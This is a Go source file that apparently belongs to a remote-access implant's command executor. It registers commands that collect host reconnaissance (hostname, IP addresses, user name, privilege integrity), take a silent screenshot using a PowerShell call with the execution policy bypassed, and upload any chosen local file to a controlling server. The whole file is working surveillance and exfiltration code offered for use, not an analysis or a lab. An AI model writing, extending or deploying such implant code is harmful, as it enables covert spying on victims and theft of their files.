package executor

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	_ = Register(
		"getinfo",
		Usage("getinfo"),
		Help("Get system information"),
		Group("platform"),
		Suggest(),
		cmdGetinfo,
	)

	_ = Register(
		"screenshot",
		Usage("screenshot"),
		Help("Capture screenshot and upload"),
		Group("platform"),
		Suggest(),
		cmdScreenshot,
	)

	_ = Register(
		"download",
		Usage("download <file>"),
		Help("Upload a local file to server"),
		Group("file"),
		Suggest(),
		cmdDownload,
	)
)

func cmdGetinfo(s *Session, _ []string) (int, string) {
	host, _ := os.Hostname()
	ips := listIPv4Addrs()

	info := map[string]string{
		"pid":          strconv.Itoa(os.Getpid()),
		"hostname":     host,
		"os":           runtime.GOOS,
		"os_version":   detectOSVersion(),
		"go_version":   runtime.Version(),
		"architecture": runtime.GOARCH,
		"cpu_count":    strconv.Itoa(runtime.NumCPU()),
		"cwd":          s.Cwd,
		"exec_path":    safeExecutablePath(),
		"ips":          strings.Join(ips, ", "),
		"integrity":    detectIntegrity(),
	}

	if userName := currentUserName(); userName != "" {
		info["username"] = userName
	}

	return 1, formatDict(info)
}

func cmdScreenshot(s *Session, _ []string) (int, string) {
	filePath, err := captureScreenshotToTemp(s.Cwd)
	if err != nil {
		return 0, fmt.Sprintf("Screenshot failed: %v", err)
	}
	defer func() { _ = os.Remove(filePath) }()

	return s.uploadSingleFileToServerResult(filePath, "screenshot")
}

func cmdDownload(s *Session, args []string) (int, string) {
	if len(args) == 0 {
		return 0, "Usage: download <file>"
	}

	target := strings.TrimSpace(strings.Join(args, " "))
	if target == "" {
		return 0, "Usage: download <file>"
	}

	if !filepath.IsAbs(target) {
		target = filepath.Join(s.Cwd, target)
	}
	target = filepath.Clean(target)

	info, err := os.Stat(target)
	if err != nil {
		return 0, fmt.Sprintf("Download failed: %v", err)
	}
	if info.IsDir() {
		return 0, "Download failed: target is a directory"
	}

	return s.uploadSingleFileToServerResult(target, "download")
}

func captureScreenshotToTemp(workDir string) (string, error) {
	filePath := filepath.Join(os.TempDir(), buildScreenshotFilename(time.Now()))

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		cmd = exec.Command("screencapture", "-x", filePath)
	case "windows":
		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $bounds.Width,$bounds.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size); $bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()`, strings.ReplaceAll(filePath, "'", "''"))
		cmd = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	default:
		if _, err := exec.LookPath("gnome-screenshot"); err == nil {
			cmd = exec.Command("gnome-screenshot", "-f", filePath)
		} else if _, err := exec.LookPath("scrot"); err == nil {
			cmd = exec.Command("scrot", filePath)
		} else if _, err := exec.LookPath("import"); err == nil {
			cmd = exec.Command("import", "-window", "root", filePath)
		} else {
			return "", fmt.Errorf("no screenshot tool found")
		}
	}

	if strings.TrimSpace(workDir) != "" {
		cmd.Dir = workDir
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%v: %s", err, strings.TrimSpace(string(out)))
	}

	info, statErr := os.Stat(filePath)
	if statErr != nil {
		return "", statErr
	}
	if info.Size() <= 0 {
		return "", fmt.Errorf("empty screenshot file")
	}

	return filePath, nil
}

// buildScreenshotFilename names the captured Artifact; directory placement is separate.
func buildScreenshotFilename(capturedAt time.Time) string {
	return fmt.Sprintf("screenshot_%s.png", capturedAt.Format("20060102_150405"))
}
